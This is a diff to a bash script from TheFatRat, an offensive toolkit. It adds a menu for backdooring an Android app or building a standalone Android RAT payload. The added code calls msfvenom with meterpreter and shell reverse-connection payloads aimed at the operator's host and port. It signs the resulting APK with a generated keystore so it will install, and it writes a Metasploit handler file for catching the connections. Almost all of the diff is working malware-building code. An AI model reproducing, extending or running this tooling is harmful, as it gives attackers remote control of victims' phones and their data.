@@ -1955,6 +1955,10 @@ if [ -z "$yourport" ]; then
 read -p '  Set LPORT: ' yourport
 fi
 echo ""
+ponly=$(zenity  --list  --radiolist  --column "Pick" --column "Action" TRUE "Create apk rat backdoor" FALSE "Create only apk payload" --text="Select an option to start :");
+case $ponly in
+
+"Create apk rat backdoor")
 copyfile=$(zenity --file-selection --file-filter='APK files (apk) | *.apk' --title="Select your app/game apk file");
 cp $copyfile $path/temp/app.apk >/dev/null 2>&1
 apkt="$path/temp/app.apk"
@@ -2139,6 +2143,51 @@ clear
 menu
 ;;
 *)
+clear
+menu
+;;
+esac;
+
+;;
+
+"Create only apk payload")
+payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
+echo -e $okegreen ""
+echo "[*] Creating RAT payload with msfvenom"
+sleep 1
+#Creating payload and storing info in logfile
+$msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/backdoored/payload.apk >>$log /dev/null 2>&1
+echo "[✔] Done!"
+echo "[*] Creating a Valid Certificate"
+sleep 1
+#Creating certificate and storing info in logfile
+$keytool -genkey -v -keystore $path/temp/debug.keystore -storepass android -alias androiddebugkey -keypass android -dname "CN=Android Debug,O=Android,C=US" -keyalg RSA -keysize 2048 -validity 10000 >>$log 2>&1
+echo "[✔] Done!"
+echo "[*] Signing your payload APK"
+sleep 1
+$sign -verbose -keystore $path/temp/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $path/backdoored/payload.apk androiddebugkey >>$log 2>&1
+echo "[✔] Done!"
+rm $path/temp/debug.keystore
+sleep 1
+echo ""
+zenity --question --text="`printf "Do you want to create a listener for this configuration \n to use in msfconsole in future ?"`"
+if [ $? = 0 ] ; then
+save=$(zenity --entry --title="Save Msfconsole Config" --width=100 --height=100 --text="Write the name for this config." --entry-text="payloadapk");
+svf=$path/config/listeners/$save.rc
+rm -rf $svf >/dev/null 2>&1
+echo "use exploit/multi/handler" > $svf
+echo "set PAYLOAD $payload" >> $svf
+echo "set LHOST $yourip" >> $svf
+echo "set LPORT $yourport" >> $svf
+echo "exploit -j" >> $svf
+echo -e $okegreen ""
+echo "Configuration file saved to $list/$save.rc"
+fi
+echo ""
+echo "Your payload apk was created and signed , and it is located in :
+$path/backdoored/payload.apk"
+echo ""
+read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
 clear
 menu
 ;;
